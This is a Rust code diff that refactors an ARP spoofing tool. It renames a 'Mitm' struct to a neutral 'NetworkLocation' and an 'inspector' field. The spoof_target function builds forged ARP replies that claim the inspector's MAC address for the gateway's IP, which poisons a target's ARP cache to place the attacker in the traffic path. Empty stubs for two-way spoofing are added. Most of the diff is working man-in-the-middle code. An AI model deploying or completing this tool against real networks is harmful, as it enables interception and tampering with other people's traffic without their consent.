@@ -4,18 +4,18 @@ use nix::sys::socket;
 use pnet::{packet::{ethernet::{EtherType, MutableEthernetPacket, EtherTypes}, arp::{Arp, ArpHardwareType, ArpOperation, ArpPacket, MutableArpPacket}, MutablePacket}, util::MacAddr, datalink::{self, NetworkInterface, Channel, DataLinkSender, DataLinkReceiver}};
 
 pub trait ArpSpoofer {
-    fn spoof_target(&mut self, ip: Ipv4Addr) -> bool;
+    fn spoof_target(&mut self, target: NetworkLocation) -> bool;
 }
 
-pub struct Mitm {
+pub struct NetworkLocation {
     pub ipv4: Ipv4Addr,
     pub hw: MacAddr
 }
 
 pub struct ArpSpooferImpl {
     interface: NetworkInterface,
-    mitm: Mitm,
-    gateway: Ipv4Addr,
+    inspector: NetworkLocation,
+    gateway: NetworkLocation,
 
     sender: Option<Box<dyn DataLinkSender>>,
     receiver: Option<Box<dyn DataLinkReceiver>>
@@ -24,12 +24,12 @@ pub struct ArpSpooferImpl {
 impl ArpSpooferImpl {
     pub fn new(
         interface: NetworkInterface,
-        mitm: Mitm, 
-        gateway: Ipv4Addr
+        inspector: NetworkLocation, 
+        gateway: NetworkLocation
     ) -> Self {
         let mut result = Self {
             interface: interface,
-            mitm: mitm,
+            inspector: inspector,
             gateway: gateway,
             sender: None,
             receiver: None
@@ -53,10 +53,10 @@ impl ArpSpooferImpl {
 }
 
 impl ArpSpoofer for ArpSpooferImpl {
-    fn spoof_target(&mut self, target: Ipv4Addr) -> bool {
+    fn spoof_target(&mut self, target: NetworkLocation) -> bool {
         // instantiate packet
 
-        println!("Spoofing target: {}", target.to_string());
+        println!("Spoofing target: {}", target.ipv4.to_string());
 
         // TODO: (@objectivecosta) Modify these values
         let mut arp_packet_buffer = [0u8; 28];
@@ -66,10 +66,10 @@ impl ArpSpoofer for ArpSpooferImpl {
         arp_packet.set_hw_addr_len(6);  // ethernet is 6 long
         arp_packet.set_proto_addr_len(4);  // ipv4s is 4 long
         arp_packet.set_operation(ArpOperation::new(2));  // 1 is request; 2 is reply.
-        arp_packet.set_sender_hw_addr(self.mitm.hw); 
-        arp_packet.set_sender_proto_addr(self.gateway); 
-        arp_packet.set_target_hw_addr(MacAddr(***REMOVED***)); // TODO: find this information manually
-        arp_packet.set_target_proto_addr(target); 
+        arp_packet.set_sender_hw_addr(self.inspector.hw); 
+        arp_packet.set_sender_proto_addr(self.gateway.ipv4); 
+        arp_packet.set_target_hw_addr(target.hw); // TODO: find this information manually
+        arp_packet.set_target_proto_addr(target.ipv4); 
 
         let mut ethernet_buffer = [0u8; 42];
         let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();
@@ -99,5 +99,15 @@ impl ArpSpoofer for ArpSpooferImpl {
         }
 
         return false;
+    }
+}
+
+impl ArpSpooferImpl {
+    fn spoof_router_for_target(&self) {
+
+    }
+
+    fn spoof_target_for_router(&self) {
+
     }
 }
